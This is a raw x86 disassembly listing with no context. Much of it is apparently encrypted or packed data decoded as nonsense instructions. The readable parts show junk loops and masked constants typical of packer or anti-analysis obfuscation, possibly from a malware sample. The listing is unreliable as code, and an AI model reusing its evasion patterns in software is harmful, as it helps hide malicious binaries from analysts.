  4030a4:	out    0xfb,eax
  4030a6:	(bad)  
  4030a7:	sbb    BYTE PTR [edx+0x29],dh
  4030aa:	push   ecx
  4030ab:	adc    DWORD PTR [eax-0x42],0x70
  4030af:	cmp    BYTE PTR [edi],al
  4030b1:	fnstcw WORD PTR [ebp+eiz*2+0x59845ba]
  4030b8:	pop    edi
  4030b9:	shld   DWORD PTR [edi+0x23],ebp,0xf1
  4030be:	fadd   DWORD PTR [esi+edx*1]
  4030c1:	pop    ebx
  4030c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c3:	out    dx,eax
  4030c4:	jge    0x403105
  4030c6:	dec    ecx
  4030c7:	scas   eax,DWORD PTR es:[edi]
  4030c8:	and    BYTE PTR [eax],ah
  4030ca:	push   0x26491e9b
  4030cf:	lds    ecx,FWORD PTR [ecx-0xd]
  4030d2:	push   edi
  4030d3:	push   ebp
  4030d4:	jb     0x403073
  4030d6:	mov    ebp,0x1814b2a4
  4030db:	mov    fs,WORD PTR [ecx+eiz*1]
  4030de:	aad    0xce
  4030e0:	shr    BYTE PTR [ebp+0x11],1
  4030e3:	push   ebx
  4030e4:	jne    0x4030ae
  4030e6:	ins    DWORD PTR es:[edi],dx
  4030e7:	shr    dh,cl
  4030e9:	not    ebx
  4030eb:	pop    edi
  4030ec:	das    
  4030ed:	add    BYTE PTR [ebp+0x1e],bl
  4030f0:	sbb    eax,0x11396b02
  4030f5:	add    eax,0xd98a8832
  4030fa:	and    esi,DWORD PTR [edx+0xcd32dfa]
  403100:	test   al,0x68
  403102:	inc    esp
  403103:	cwde   
  403104:	pop    ebx
  403105:	dec    esp
  403106:	xchg   edx,eax
  403107:	push   eax
  403108:	in     al,0x24
  40310a:	or     DWORD PTR [eax],ecx
  40310c:	push   edi
  40310d:	mov    cl,0x46
  40310f:	xor    DWORD PTR [ecx+0x1f],edx
  403112:	sbb    DWORD PTR [ebp-0x1af14b41],0x6a6df608
  40311c:	sbb    al,0x7b
  40311e:	repnz (bad) 
  403120:	in     eax,dx
  403121:	jge    0x403171
  403123:	rol    dl,cl
  403125:	jbe    0x403173
  403127:	pop    ebp
  403128:	hlt    
  403129:	push   ebp
  40312a:	push   ds
  40312b:	xor    DWORD PTR [ecx+0x6cb8e705],ecx
  403131:	adc    BYTE PTR ss:[ebx+0x30],cl
  403135:	xor    esi,esp
  403137:	mov    ss,WORD PTR [esi+0x4b]
  40313a:	fidivr DWORD PTR [eax-0x1]
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	rcl    esp,0x8b
  40315e:	test   DWORD PTR [edx+0x7e7e17ba],ebx
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x403132
  403169:	aas    
  40316a:	es inc esi
  40316c:	mov    BYTE PTR [edx],dh
  40316e:	ins    DWORD PTR es:[edi],dx
  40316f:	adc    eax,DWORD PTR [edx]
  403171:	adc    DWORD PTR [eax+ebx*4-0x5],esp
  403175:	pop    esi
  403176:	sbb    DWORD PTR [edx-0x3f],eax
  403179:	jmp    0x4031b5
  40317b:	or     al,0xbb
  40317d:	push   ds
  40317e:	call   0x18c:0x8aab5180
  403185:	or     esp,DWORD PTR [ebp-0x64]
  403188:	push   ss
  403189:	repnz cs mov dh,0x74
  40318d:	and    DWORD PTR [esi+esi*2],0x62
  403191:	arpl   WORD PTR ds:[ecx],dx
  403194:	(bad)  
  403195:	(bad)
  403198:	xchg   DWORD PTR [ebx+0x49],ebx
  40319b:	(bad)  
  40319e:	jns    0x403179
  4031a0:	lock xchg BYTE PTR [eax-0x1de0bd64],dh
  4031a7:	jno    0x40320b
  4031a9:	pop    eax
  4031aa:	add    BYTE PTR [ecx+0x68731d05],ch
  4031b0:	xor    BYTE PTR [edx+0x20],ah
  4031b3:	sub    BYTE PTR [ecx-0x7e3c5749],cl
  4031b9:	add    DWORD PTR [eax-0x3152cd23],ebx
  4031bf:	icebp  
  4031c0:	push   ecx
  4031c1:	outs   dx,BYTE PTR ds:[esi]
  4031c2:	ss mov ah,0xf6
  4031c5:	fist   DWORD PTR [esi]
  4031c7:	dec    ebx
  4031c8:	jns    0x40321e
  4031ca:	fnsave [edx+eax*4+0x244def6b]
  4031d1:	cmp    al,BYTE PTR [ebx+0x4f]
  4031d4:	mov    bh,0xbe
  4031d6:	pop    ss
  4031d7:	repz jmp 0x403184
  4031da:	ret    
  4031db:	mov    DWORD PTR [ebp+0x24],esp
  4031de:	aas    
  4031df:	pcmpgtw mm4,mm3
  4031e2:	test   eax,0x6c86c1f3
  4031e7:	xchg   BYTE PTR [edi],cl
  4031e9:	shr    DWORD PTR [edx],cl
  4031eb:	popa   
  4031ec:	mov    ch,0xf
  4031ee:	or     BYTE PTR [edx+0x4ab80fb0],0x0
  4031f5:	ror    DWORD PTR [eax-0x24d1e33d],cl
  4031fb:	adc    DWORD PTR [esi-0x70aff8cb],edi
  403201:	(bad)  
  403202:	std    
  403203:	lods   al,BYTE PTR ds:[esi]
  403204:	xor    DWORD PTR [ecx],esi
  403206:	call   esp
  403208:	push   esi
  403209:	jb     0x40324c
  40320b:	mov    eax,ds:0x8f269935
  403210:	mov    eax,ds:0xb9061323
  403215:	xchg   ebp,eax
  403216:	mov    bl,0x45
  403218:	and    al,0xf2
  40321a:	int    0x3e
  40321c:	sbb    al,0x38
  40321e:	jl     0x40324c
  403220:	out    0x60,eax
  403222:	cmp    BYTE PTR [eax],ah
  403224:	test   edx,ebp
  403226:	ins    BYTE PTR es:[edi],dx
  403227:	xchg   ecx,eax
  403228:	cmp    ecx,DWORD PTR [ecx+0x42]
  40322b:	dec    esi
  40322c:	mov    ebx,0xa8fbbbe0
  403231:	cmp    BYTE PTR [ecx-0x58],bl
  403234:	test   BYTE PTR [eax],ah
  403236:	or     dh,BYTE PTR [edi+0x24]
  403239:	or     DWORD PTR [esi],ebp
  40323b:	mov    edi,0xe3f1017e
  403240:	inc    edx
  403241:	push   ecx
  403242:	jb     0x4032bd
  403244:	(bad)  
  403245:	jg     0x40323d
  403247:	push   ebp
  403248:	add    edi,ebp
  40324a:	ins    BYTE PTR es:[edi],dx
  40324b:	sbb    al,0xd7
  40324d:	dec    eax
  40324e:	xor    al,0x3b
  403250:	gs pop edx
  403252:	adc    ah,ah
  403254:	in     eax,0xcf
  403256:	and    edi,esi
  403258:	and    al,0xc3
  40325a:	cmp    eax,0x37e1be84
  40325f:	retf   
  403260:	daa    
  403261:	scas   al,BYTE PTR es:[edi]
  403262:	das    
  403263:	js     0x403202
  403265:	xchg   ebp,eax
  403266:	aas    
  403267:	inc    edx
  403268:	iret   
  403269:	dec    ebp
  40326a:	add    BYTE PTR [edi-0xd3e0450],0xb0
  403271:	cmp    BYTE PTR [ecx-0x2],0x5f
  403275:	adc    DWORD PTR [edx+0xdcbd119],ecx
  40327b:	mov    edx,0x3cb71e0f
  403280:	jle    0x403213
  403282:	aas    
  403283:	lahf   
  403284:	inc    esp
  403285:	adc    BYTE PTR [ebp-0x74],dh
  403288:	add    al,0xd9
  40328a:	loopne 0x4032ef
  40328c:	jle    0x4032f1
  40328e:	jb     0x4032d6
  403290:	outs   dx,DWORD PTR ds:[esi]
  403291:	fcomp  QWORD PTR [ebx]
  403293:	xor    DWORD PTR [ebx],esi
  403295:	pop    ebp
  403296:	test   DWORD PTR [esi-0x26f5999b],ebx
  40329c:	push   eax
  40329d:	xor    bh,BYTE PTR [ebx+0x11]
  4032a0:	jl     0x40322b
  4032a2:	retf   
  4032a3:	adc    BYTE PTR [edi],0x16
  4032a6:	enter  0xa9a7,0x91
  4032aa:	fisubr DWORD PTR [edx+0x4df7287a]
  4032b0:	inc    esi
  4032b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b3:	ss es das 
  4032b6:	jg     0x40323d
  4032b8:	(bad)  
  4032ba:	sub    al,BYTE PTR [ecx-0x591f0655]
  4032c0:	aas    
  4032c1:	sub    al,0x1d
  4032c3:	push   edx
  4032c4:	cmp    eax,0xca3710a9
  4032c9:	and    BYTE PTR [esi],ah
  4032cb:	int    0xf1
  4032cd:	jge    0x4032cb
  4032cf:	inc    DWORD PTR [ebx-0x65a1e8d8]
  4032d5:	dec    ecx
  4032d6:	out    0x61,eax
  4032d8:	sbb    DWORD PTR [ecx+ebx*8-0x61700418],edi
  4032df:	push   ds
  4032e0:	push   ecx
  4032e1:	and    BYTE PTR [esi+0x79e0013e],ch
  4032e7:	loop   0x40331f
  4032e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ea:	sub    eax,0xc95b5ea5
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x39ccd48a]
  403537:	fsub   DWORD PTR [edx+0x7e7e15c6]
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x40357b
  403542:	sar    BYTE PTR [edi+eax*8],0xad
  403546:	in     eax,dx
  403547:	add    DWORD PTR [ebx+0x3],esp
  40354a:	je     0x4035ae
  40354c:	or     eax,esi
  40354e:	sbb    bl,BYTE PTR [edi-0xcb83d62]
  403554:	aam    0x7d
  403556:	jle    0x4034f6
  403558:	cdq    
  403559:	stos   DWORD PTR es:[edi],eax
  40355a:	jl     0x4035a0
  40355c:	stc    
  40355d:	add    BYTE PTR [ebp-0x1c0cd5f3],dl
  403563:	(bad)  
  403565:	(bad)  [ebx-0x28]
  403568:	loope  0x4035b9
  40356a:	mov    esi,0x8b9dcaa5
  40356f:	int3   
  403570:	int    0x56
  403572:	lds    ebp,FWORD PTR ss:[ebp+0x101e808a]
  403579:	push   esp
  40357a:	or     eax,0xfa6e241c
  40357f:	push   ebx
  403580:	pop    ds
  403581:	mov    dh,0xc4
  403583:	sbb    DWORD PTR [edi+0x52],ecx
  403586:	popa   
  403587:	mov    dh,0x7d
  403589:	inc    edx
  40358a:	and    eax,0xf2142264
  40358f:	and    DWORD PTR [eax+0x10],edx
  403592:	bound  ebx,QWORD PTR [ecx]
  403594:	or     DWORD PTR [ebx-0x26adf460],ebx
  40359a:	pop    edi
  40359b:	rcl    DWORD PTR [ebx],cl
  40359d:	dec    ecx
  40359e:	jbe    0x403566
  4035a0:	cmp    BYTE PTR [ebp+0x7b],bh
  4035a3:	mov    ebx,0x1d63e734
  4035a8:	pop    ebx
  4035a9:	in     al,dx
  4035aa:	dec    ebx
  4035ab:	xchg   edx,eax
  4035ac:	scas   al,BYTE PTR es:[edi]
  4035ad:	sbb    BYTE PTR [ebx+0x60],0x29
  4035b1:	cmp    eax,0x7881793
  4035b6:	repnz cs xor dh,al
  4035ba:	cmp    al,0x8d
  4035bc:	(bad)  
  4035bd:	pusha  
  4035be:	iret   
  4035bf:	test   DWORD PTR [esi-0x4c],ebp
  4035c2:	sbb    eax,0x3065af64
  4035c7:	sbb    edi,0x5e
  4035ca:	aaa    
  4035cb:	gs push esi
  4035cd:	das    
  4035ce:	jp     0x4035f7
  4035d0:	push   esp
  4035d1:	mov    BYTE PTR [ebp+0x19],cl
  4035d4:	mov    dl,0x82
  4035d6:	mov    esi,0x9632f412
  4035db:	adc    eax,0x182d430d
  4035e0:	mov    DWORD PTR [ebp-0x65c59765],eax
  4035e6:	popf   
  4035e7:	push   cs
  4035e8:	fwait
  4035e9:	lds    esi,FWORD PTR [ebx]
  4035eb:	inc    eax
  4035ec:	in     al,dx
  4035ed:	pushf  
  4035ee:	pushf  
  4035ef:	jg     0x4035d3
  4035f1:	test   eax,0xcf9a3294
  4035f6:	mov    esi,cs
  4035f8:	jecxz  0x4035fc
  4035fa:	test   bh,dh
  4035fc:	xor    ch,ah
  4035fe:	ja     0x403634
  403600:	or     BYTE PTR [eax],0xda
  403603:	pushf  
  403604:	dec    edx
  403605:	jp     0x4035f3
  403607:	pop    ebx
  403608:	push   eax
  403609:	mov    dl,0x41
  40360b:	push   edx
  40360c:	dec    ebp
  40360d:	mov    edx,0x62c62346
  403612:	push   ebx
  403613:	push   cs
  403614:	aad    0x57
  403616:	pop    esp
  403617:	sub    DWORD PTR [edi-0x7fe2560f],edi
  40361d:	mov    dl,0x80
  40361f:	xor    DWORD PTR [eax+ecx*8],eax
  403622:	retf   0x2976
  403625:	jno    0x4035ad
  403627:	jne    0x403615
  403629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40362a:	popf   
  40362b:	jmp    0x403697
  40362d:	dec    esi
  40362e:	mov    WORD PTR [esi],ds
  403630:	dec    esp
  403631:	jp     0x403602
  403633:	hlt    
  403634:	adc    dh,BYTE PTR [ebx-0x113979ed]
  40363a:	imul   eax,DWORD PTR [eax+0x5e],0xc57c3a31
  403641:	inc    edx
  403642:	add    bl,dh
  403644:	inc    edx
  403645:	xchg   ebp,eax
  403646:	ret    
  403647:	scas   eax,DWORD PTR es:[edi]
  403648:	ins    BYTE PTR es:[edi],dx
  403649:	cs push esi
  40364b:	popf   
  40364c:	out    0xd0,al
  40364e:	dec    esp
  40364f:	xor    cl,ch
  403651:	cli    
  403652:	mov    ah,0x96
  403654:	jmp    0xc87a:0x48cd014
  40365b:	sub    eax,0xbdac2938
  403660:	retf   0x5c5f
  403663:	jge    0x403644
  403665:	dec    esi
  403666:	mov    eax,DWORD PTR [edi-0x2f]
  403669:	cmp    eax,0x20d3e8b
  40366e:	mov    cl,0x13
  403670:	hlt    
  403671:	or     al,0xaa
  403673:	pushf  
  403674:	dec    ebx
  403675:	(bad)  
  403676:	push   0x8bf6b236
  40367b:	mov    dh,0x53
  40367d:	or     esp,0xffffff9a
  403680:	data16 xlat BYTE PTR ds:[ebx]
  403682:	adc    eax,0x22d19051
  403687:	push   0x7f5e0bd7
  40368c:	mov    dl,0x90
  40368e:	or     edx,DWORD PTR [eax]
  403690:	iret   
  403691:	out    dx,eax
  403692:	arpl   sp,bx
  403694:	push   edx
  403695:	dec    esi
  403696:	out    0x51,al
  403698:	cmc    
  403699:	or     BYTE PTR [edi],dh
  40369b:	mov    al,ds:0x6dc268d2
  4036a0:	ja     0x403654
  4036a2:	in     al,0xc7
  4036a4:	retf   0x4501
  4036a7:	(bad)  
  4036a8:	xor    al,0x67
  4036aa:	cmp    cl,dh
  4036ac:	std    
  4036ad:	or     al,dh
  4036af:	sbb    ch,BYTE PTR [ebx]
  4036b1:	push   eax
  4036b2:	scas   al,BYTE PTR es:[edi]
  4036b3:	mov    al,0xd8
  4036b5:	stos   BYTE PTR es:[edi],al
  4036b6:	fwait
  4036b7:	stos   DWORD PTR es:[edi],eax
  4036b8:	mov    al,0x7d
  4036ba:	cmp    al,0x3a
  4036bc:	pop    esi
  4036bd:	mov    edi,0xe0ee3c3a
  4036c2:	and    al,0x34
  4036c4:	jecxz  0x403700
  4036c6:	xor    BYTE PTR [esi],cl
  4036c8:	jbe    0x4036d4
  4036ca:	xchg   BYTE PTR [ebx+0x2c],al
  4036cd:	sub    edx,0x8bc62519
  4036d3:	pop    ebp
  4036d4:	mov    ebx,0x882fdfdf
  4036d9:	sbb    BYTE PTR [ebp-0x36fb2596],bl
  4036df:	(bad)  
  4036e0:	fisubr WORD PTR [eax-0x4f0e2fd9]
  4036e6:	push   eax
  4036e7:	mov    ebp,0x67a405ea
  4036ec:	cmp    eax,0x471cb10a
  4036f1:	xchg   ecx,eax
  4036f2:	stc    
  4036f3:	scas   eax,DWORD PTR es:[edi]
  4036f4:	inc    ebp
  4036f5:	dec    ebx
  4036f6:	adc    eax,0x68520b1c
  4036fb:	inc    ecx
  4036fc:	jle    0x40372e
  4036fe:	mov    bh,0x66
  403700:	pop    ebx
  403701:	add    DWORD PTR [esi+0x12fef0e5],ebp
  403707:	mov    bh,0xac
  403709:	sub    bh,BYTE PTR [ebx-0x5d]
  40370c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40370d:	xor    al,0xd2
  403710:	mov    WORD PTR cs:[ebp+0x2],fs
  403714:	lds    cx,DWORD PTR [edi+0x6e]
  403718:	jnp    0x4036c5
  40371a:	pop    es
  40371b:	repz add eax,0xfa355e37
  403721:	retf   
  403722:	call   0x5d4c:0xfa79b001
  403729:	xor    DWORD PTR fs:[esi-0x7a305081],ecx
  403730:	cwde   
  403731:	inc    edx
  403732:	loope  0x4036da
  403734:	stos   DWORD PTR es:[edi],eax
  403735:	mul    DWORD PTR [ebx]
  403737:	inc    esi
  403738:	jo     0x4037ac
  40373a:	mov    ds:0x97088d00,eax
  40373f:	ror    sp,1
  403742:	xchg   esi,eax
  403743:	inc    esp
  403744:	ins    BYTE PTR es:[edi],dx
  403745:	adc    BYTE PTR [edi],0xc7
  403748:	pop    ecx
  403749:	push   0x84ae2eb1
  40374e:	pop    ebx
  40374f:	jb     0x403754
  403751:	jecxz  0x4036e4
  403753:	cmp    al,0x13
  403755:	int3   
  403756:	push   0xffffffe5
  403758:	cmp    BYTE PTR [ebp+0x55],bh
  40375b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40375c:	into   
  40375d:	into   
  40375e:	test   DWORD PTR [ecx+0x1c],edx
  403761:	lods   al,BYTE PTR ds:[esi]
  403762:	fild   DWORD PTR [ebx+0x43]
  403765:	mov    ebp,0x24d1e3f4
  40376a:	jmp    0x7343894
  40376f:	mov    gs,WORD PTR [edx+ecx*4+0x5c37d0d4]
  403776:	in     al,0x1b
  403778:	pusha  
  403779:	adc    bl,BYTE PTR [esi+0x6959341]
  40377f:	repnz xchg ebp,eax
  403781:	lods   eax,DWORD PTR ds:[esi]
  403782:	mov    ah,0x6
  403784:	inc    edi
  403785:	out    dx,al
  403786:	push   cs
  403787:	jle    0x403774
  403789:	shl    BYTE PTR [eax],cl
  40378b:	jb     0x4037d4
  40378d:	imul   eax,DWORD PTR [esi-0x7b044df4],0x547f4400
  403797:	daa    
  403798:	xor    DWORD PTR [ebp+0x5f2dce43],ebp
  40379e:	sar    DWORD PTR [edx],0xec
  4037a1:	push   ebx
  4037a2:	push   ss
  4037a3:	arpl   cx,bx
  4037a5:	inc    ebx
  4037a6:	add    al,0x48
  4037a8:	mov    eax,ds:0xb37901f5
  4037ad:	mov    ds:0x8a0d8022,al
  4037b2:	aad    0x64
  4037b4:	ds mov dh,0x1a
  4037b7:	stc    
  4037b8:	and    eax,0xa8465a7e
  4037bd:	fmul   QWORD PTR [edx+0x48132c9a]
  4037c3:	sub    ecx,0xae7751c6
  4037c9:	or     DWORD PTR [edi],ebp
  4037cb:	ins    BYTE PTR es:[edi],dx
  4037cc:	test   DWORD PTR [eax],ecx
  4037ce:	and    BYTE PTR [eax+0x506a4363],cl
  4037d4:	scas   eax,DWORD PTR es:[edi]
  4037d5:	mov    ch,BYTE PTR [edx+0x4b5b05f7]
  4037db:	dec    edi
  4037dc:	pop    esp
  4037dd:	aad    0x68
  4037df:	xchg   esi,eax
  4037e0:	fdivr  DWORD PTR [esi]
  4037e2:	test   eax,0xd366d836
  4037e8:	hlt    
  4037e9:	mov    cl,0x8d
  4037eb:	mov    al,0x29
  4037ed:	jmp    0x40383d
  4037ef:	out    dx,eax
  4037f0:	or     DWORD PTR [ebx],esi
  4037f2:	cdq    
  4037f3:	or     edi,edi
  4037f5:	add    ebx,DWORD PTR ds:0xca003bba
  4037fb:	mov    dh,0x66
  4037fd:	(bad)
  403801:	(bad)  [edx]
  403803:	sub    bl,ch
  403805:	xchg   edi,eax
  403806:	leave  
  403807:	dec    esi
  403808:	cmp    BYTE PTR [ebp+0x53db9b53],cl
  40380e:	sbb    ebp,eax
  403810:	mov    bh,0x79
  403812:	mov    ah,0x1a
  403814:	in     al,0xea
  403816:	lods   al,BYTE PTR ds:[esi]
  403817:	mov    WORD PTR [edi+ebx*8-0x3d],es
  40381b:	sub    eax,0xb3003931
  403820:	fmul   QWORD PTR [edx]
  403822:	loopne 0x4037cf
  403824:	dec    edi
  403825:	sti    
  403826:	push   esi
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x4335fb
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x4336ab
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x433727,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
